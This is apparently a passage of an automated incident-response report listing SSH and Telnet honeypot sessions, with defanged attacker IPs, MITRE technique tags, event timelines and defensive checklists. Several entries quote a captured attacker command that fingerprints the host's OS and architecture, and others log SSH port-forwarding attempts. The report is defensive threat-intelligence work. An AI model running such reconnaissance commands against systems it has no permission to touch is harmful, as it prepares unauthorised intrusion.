| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:19:54` | `cowrie.session.connect` |
| `2026-09-04 05:19:54` | `cowrie.client.version` |
| `2026-09-04 05:19:54` | `cowrie.client.kex` |
| `2026-09-04 05:19:55` | `cowrie.login.success` |
| `2026-09-04 05:19:56` | `cowrie.session.params` |
| `2026-09-04 05:19:56` | `cowrie.command.input` |
| `2026-09-04 05:19:56` | `cowrie.command.input` |
| `2026-09-04 05:19:56` | `cowrie.command.input` |
| `2026-09-04 05:19:56` | `cowrie.command.input` |
| `2026-09-04 05:19:56` | `cowrie.command.input` |
| `2026-09-04 05:19:56` | `cowrie.command.success` |
| `2026-09-04 05:19:56` | `cowrie.command.input` |
| `2026-09-04 05:19:56` | `cowrie.command.input` |
| `2026-09-04 05:19:56` | `cowrie.command.input` |
| `2026-09-04 05:19:56` | `cowrie.command.input` |
| `2026-09-04 05:19:56` | `cowrie.log.closed` |
| `2026-09-04 05:19:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-541b0496a6e4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:22 |
| **Last Seen** | 2026-09-04 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:22:24` | `cowrie.session.connect` |
| `2026-09-04 05:22:24` | `cowrie.client.version` |
| `2026-09-04 05:22:24` | `cowrie.client.kex` |
| `2026-09-04 05:22:25` | `cowrie.login.success` |
| `2026-09-04 05:22:26` | `cowrie.session.params` |
| `2026-09-04 05:22:26` | `cowrie.command.input` |
| `2026-09-04 05:22:26` | `cowrie.command.input` |
| `2026-09-04 05:22:26` | `cowrie.command.input` |
| `2026-09-04 05:22:26` | `cowrie.command.input` |
| `2026-09-04 05:22:26` | `cowrie.command.input` |
| `2026-09-04 05:22:26` | `cowrie.command.success` |
| `2026-09-04 05:22:26` | `cowrie.command.input` |
| `2026-09-04 05:22:26` | `cowrie.command.input` |
| `2026-09-04 05:22:26` | `cowrie.command.input` |
| `2026-09-04 05:22:26` | `cowrie.command.input` |
| `2026-09-04 05:22:26` | `cowrie.log.closed` |
| `2026-09-04 05:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7e43e40fe75

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 05:24 |
| **Last Seen** | 2026-09-04 05:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:24:39` | `cowrie.session.connect` |
| `2026-09-04 05:24:39` | `cowrie.client.version` |
| `2026-09-04 05:24:39` | `cowrie.client.kex` |
| `2026-09-04 05:24:40` | `cowrie.login.success` |
| `2026-09-04 05:24:40` | `cowrie.direct-tcpip.request` |
| `2026-09-04 05:24:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 05:24:41` | `cowrie.direct-tcpip.data` |
| `2026-09-04 05:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2d9b1f62260

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:25 |
| **Last Seen** | 2026-09-04 05:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:25:23` | `cowrie.session.connect` |
| `2026-09-04 05:25:23` | `cowrie.client.version` |
| `2026-09-04 05:25:23` | `cowrie.client.kex` |
| `2026-09-04 05:25:24` | `cowrie.login.success` |
| `2026-09-04 05:25:25` | `cowrie.session.params` |
| `2026-09-04 05:25:25` | `cowrie.command.input` |
| `2026-09-04 05:25:25` | `cowrie.command.input` |
| `2026-09-04 05:25:25` | `cowrie.command.input` |
| `2026-09-04 05:25:25` | `cowrie.command.input` |
| `2026-09-04 05:25:25` | `cowrie.command.input` |
| `2026-09-04 05:25:25` | `cowrie.command.success` |
| `2026-09-04 05:25:25` | `cowrie.command.input` |
| `2026-09-04 05:25:25` | `cowrie.command.input` |
| `2026-09-04 05:25:25` | `cowrie.command.input` |
| `2026-09-04 05:25:25` | `cowrie.command.input` |
| `2026-09-04 05:25:26` | `cowrie.log.closed` |
| `2026-09-04 05:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaf36f1ddcea

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:27 |
| **Last Seen** | 2026-09-04 05:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:27:25` | `cowrie.session.connect` |
| `2026-09-04 05:27:26` | `cowrie.client.version` |
| `2026-09-04 05:27:26` | `cowrie.client.kex` |
| `2026-09-04 05:27:28` | `cowrie.login.success` |
| `2026-09-04 05:27:30` | `cowrie.session.params` |
| `2026-09-04 05:27:30` | `cowrie.command.input` |
| `2026-09-04 05:27:30` | `cowrie.command.input` |
| `2026-09-04 05:27:30` | `cowrie.command.input` |
| `2026-09-04 05:27:30` | `cowrie.command.input` |
| `2026-09-04 05:27:30` | `cowrie.command.input` |
| `2026-09-04 05:27:30` | `cowrie.command.success` |
| `2026-09-04 05:27:30` | `cowrie.command.input` |
| `2026-09-04 05:27:30` | `cowrie.command.input` |
| `2026-09-04 05:27:30` | `cowrie.command.input` |
| `2026-09-04 05:27:30` | `cowrie.command.input` |
| `2026-09-04 05:27:31` | `cowrie.log.closed` |
| `2026-09-04 05:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bcf1ba61460

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:29 |
| **Last Seen** | 2026-09-04 05:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:29:22` | `cowrie.session.connect` |
| `2026-09-04 05:29:22` | `cowrie.client.version` |
| `2026-09-04 05:29:22` | `cowrie.client.kex` |
| `2026-09-04 05:29:24` | `cowrie.login.success` |
| `2026-09-04 05:29:26` | `cowrie.session.params` |
| `2026-09-04 05:29:26` | `cowrie.command.input` |
| `2026-09-04 05:29:26` | `cowrie.command.input` |
| `2026-09-04 05:29:26` | `cowrie.command.input` |
| `2026-09-04 05:29:26` | `cowrie.command.input` |
| `2026-09-04 05:29:26` | `cowrie.command.input` |
| `2026-09-04 05:29:26` | `cowrie.command.success` |
| `2026-09-04 05:29:26` | `cowrie.command.input` |
| `2026-09-04 05:29:26` | `cowrie.command.input` |
| `2026-09-04 05:29:26` | `cowrie.command.input` |
| `2026-09-04 05:29:26` | `cowrie.command.input` |
| `2026-09-04 05:29:27` | `cowrie.log.closed` |
| `2026-09-04 05:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-973f49d38081

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:31 |
| **Last Seen** | 2026-09-04 05:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:31:21` | `cowrie.session.connect` |
| `2026-09-04 05:31:21` | `cowrie.client.version` |
| `2026-09-04 05:31:21` | `cowrie.client.kex` |
| `2026-09-04 05:31:23` | `cowrie.login.success` |
| `2026-09-04 05:31:25` | `cowrie.session.params` |
| `2026-09-04 05:31:25` | `cowrie.command.input` |
| `2026-09-04 05:31:25` | `cowrie.command.input` |
| `2026-09-04 05:31:25` | `cowrie.command.input` |
| `2026-09-04 05:31:25` | `cowrie.command.input` |
| `2026-09-04 05:31:25` | `cowrie.command.input` |
| `2026-09-04 05:31:25` | `cowrie.command.success` |
| `2026-09-04 05:31:25` | `cowrie.command.input` |
| `2026-09-04 05:31:25` | `cowrie.command.input` |
| `2026-09-04 05:31:25` | `cowrie.command.input` |
| `2026-09-04 05:31:25` | `cowrie.command.input` |
| `2026-09-04 05:31:25` | `cowrie.log.closed` |
| `2026-09-04 05:31:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a68701d50ea1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:33 |
| **Last Seen** | 2026-09-04 05:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:33:25` | `cowrie.session.connect` |
| `2026-09-04 05:33:25` | `cowrie.client.version` |
| `2026-09-04 05:33:25` | `cowrie.client.kex` |
| `2026-09-04 05:33:27` | `cowrie.login.success` |
| `2026-09-04 05:33:29` | `cowrie.session.params` |
| `2026-09-04 05:33:29` | `cowrie.command.input` |
| `2026-09-04 05:33:29` | `cowrie.command.input` |
| `2026-09-04 05:33:29` | `cowrie.command.input` |
| `2026-09-04 05:33:29` | `cowrie.command.input` |
| `2026-09-04 05:33:29` | `cowrie.command.input` |
| `2026-09-04 05:33:29` | `cowrie.command.success` |
| `2026-09-04 05:33:29` | `cowrie.command.input` |
| `2026-09-04 05:33:29` | `cowrie.command.input` |
| `2026-09-04 05:33:29` | `cowrie.command.input` |
| `2026-09-04 05:33:29` | `cowrie.command.input` |
| `2026-09-04 05:33:29` | `cowrie.log.closed` |
| `2026-09-04 05:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06cc1f04e34f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:35 |
| **Last Seen** | 2026-09-04 05:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:35:29` | `cowrie.session.connect` |
| `2026-09-04 05:35:29` | `cowrie.client.version` |
| `2026-09-04 05:35:29` | `cowrie.client.kex` |
| `2026-09-04 05:35:31` | `cowrie.login.success` |
| `2026-09-04 05:35:32` | `cowrie.session.params` |
| `2026-09-04 05:35:32` | `cowrie.command.input` |
| `2026-09-04 05:35:32` | `cowrie.command.input` |
| `2026-09-04 05:35:32` | `cowrie.command.input` |
| `2026-09-04 05:35:32` | `cowrie.command.input` |
| `2026-09-04 05:35:32` | `cowrie.command.input` |
| `2026-09-04 05:35:32` | `cowrie.command.success` |
| `2026-09-04 05:35:32` | `cowrie.command.input` |
| `2026-09-04 05:35:32` | `cowrie.command.input` |
| `2026-09-04 05:35:32` | `cowrie.command.input` |
| `2026-09-04 05:35:32` | `cowrie.command.input` |
| `2026-09-04 05:35:33` | `cowrie.log.closed` |
| `2026-09-04 05:35:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80bb1e1a3a7f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 05:35 |
| **Last Seen** | 2026-09-04 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:35:34` | `cowrie.session.connect` |
| `2026-09-04 05:35:34` | `cowrie.client.version` |
| `2026-09-04 05:35:35` | `cowrie.client.kex` |
| `2026-09-04 05:35:35` | `cowrie.login.success` |
| `2026-09-04 05:35:36` | `cowrie.direct-tcpip.request` |
| `2026-09-04 05:35:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 05:35:36` | `cowrie.direct-tcpip.data` |
| `2026-09-04 05:35:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ba90daa5469

| Field | Detail |
|---|---|
| **Source IP** | `31.70.84[.]142` |
| **First Seen** | 2026-09-04 05:41 |
| **Last Seen** | 2026-09-04 05:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:41:40` | `cowrie.session.connect` |
| `2026-09-04 05:41:41` | `cowrie.telnet.option` |
| `2026-09-04 05:41:41` | `cowrie.telnet.option` |
| `2026-09-04 05:42:42` | `cowrie.login.success` |
| `2026-09-04 05:42:42` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `31.70.84[.]142` to AbuseIPDB if not already reported
- [ ] Block `31.70.84[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb898d63f122

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 05:46 |
| **Last Seen** | 2026-09-04 05:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:46:37` | `cowrie.session.connect` |
| `2026-09-04 05:46:37` | `cowrie.client.version` |
| `2026-09-04 05:46:38` | `cowrie.client.kex` |
| `2026-09-04 05:46:38` | `cowrie.login.success` |
| `2026-09-04 05:46:39` | `cowrie.direct-tcpip.request` |
| `2026-09-04 05:46:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 05:46:39` | `cowrie.direct-tcpip.data` |
| `2026-09-04 05:46:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca406c18f4b6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 05:57 |
| **Last Seen** | 2026-09-04 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:57:38` | `cowrie.session.connect` |
| `2026-09-04 05:57:38` | `cowrie.client.version` |
| `2026-09-04 05:57:38` | `cowrie.client.kex` |
| `2026-09-04 05:57:39` | `cowrie.login.success` |
| `2026-09-04 05:57:39` | `cowrie.direct-tcpip.request` |
| `2026-09-04 05:57:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 05:57:40` | `cowrie.direct-tcpip.data` |
| `2026-09-04 05:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a09e6ca80f2

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-04 06:01 |
| **Last Seen** | 2026-09-04 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 06:01:39` | `cowrie.session.connect` |
| `2026-09-04 06:01:39` | `cowrie.client.version` |
| `2026-09-04 06:01:39` | `cowrie.client.kex` |
| `2026-09-04 06:01:39` | `cowrie.login.success` |
| `2026-09-04 06:01:40` | `cowrie.direct-tcpip.request` |
| `2026-09-04 06:01:40` | `cowrie.direct-tcpip.data` |
| `2026-09-04 06:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9badbf8b9bbb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 06:08 |
| **Last Seen** | 2026-09-04 06:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 06:08:38` | `cowrie.session.connect` |
| `2026-09-04 06:08:38` | `cowrie.client.version` |
| `2026-09-04 06:08:38` | `cowrie.client.kex` |
| `2026-09-04 06:08:39` | `cowrie.login.success` |
| `2026-09-04 06:08:39` | `cowrie.direct-tcpip.request` |
| `2026-09-04 06:08:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 06:08:40` | `cowrie.direct-tcpip.data` |
| `2026-09-04 06:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-776b00a4fc14

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 06:19 |
| **Last Seen** | 2026-09-04 06:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 06:19:39` | `cowrie.session.connect` |
| `2026-09-04 06:19:39` | `cowrie.client.version` |
| `2026-09-04 06:19:39` | `cowrie.client.kex` |
| `2026-09-04 06:19:40` | `cowrie.login.success` |
| `2026-09-04 06:19:40` | `cowrie.direct-tcpip.request` |
| `2026-09-04 06:19:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 06:19:40` | `cowrie.direct-tcpip.data` |
| `2026-09-04 06:19:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90ead9184070

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 06:30 |
| **Last Seen** | 2026-09-04 06:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 06:30:39` | `cowrie.session.connect` |
| `2026-09-04 06:30:39` | `cowrie.client.version` |
| `2026-09-04 06:30:40` | `cowrie.client.kex` |
| `2026-09-04 06:30:40` | `cowrie.login.success` |
| `2026-09-04 06:30:41` | `cowrie.direct-tcpip.request` |
| `2026-09-04 06:30:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 06:30:41` | `cowrie.direct-tcpip.data` |
| `2026-09-04 06:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
